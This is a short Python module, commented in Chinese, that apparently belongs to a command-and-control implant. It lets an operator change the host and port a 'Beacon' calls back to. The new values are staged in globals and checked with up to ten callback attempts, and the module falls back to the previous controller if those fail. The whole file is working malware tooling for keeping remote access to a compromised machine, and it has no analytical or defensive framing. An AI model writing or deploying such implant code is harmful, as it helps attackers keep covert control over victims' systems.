"""
@module: set_host
@desc: 修改 Beacon 回连地址和端口(验证后生效,失败自动回退)
"""
MODULE = {
    "desc": "修改 Beacon 回连地址和端口(最多回连验证 10 次,失败自动回退)",
    "params": [("host", "必填"), ("port", "必填")],
}


def run(host, port):
    """新参数先写入 _SET_PENDING, 主循环用新值回连验证:
    成功(welcome)即生效; 连续 10 次失败回退原连接参数。"""
    _sp = globals().get("_SET_PENDING")
    if not isinstance(_sp, dict):
        _sp = {}
    _sp["host"] = host
    _sp["port"] = int(port)
    globals()["_SET_PENDING"] = _sp
    globals()["_SET_TRY"] = 0
    return (f"pending host={host} port={int(port)}——接下来最多回连验证 10 次, "
            f"成功即生效, 失败自动回退原连接")


if __name__ == "__main__":
    print("usage: set_host <host> <port>")
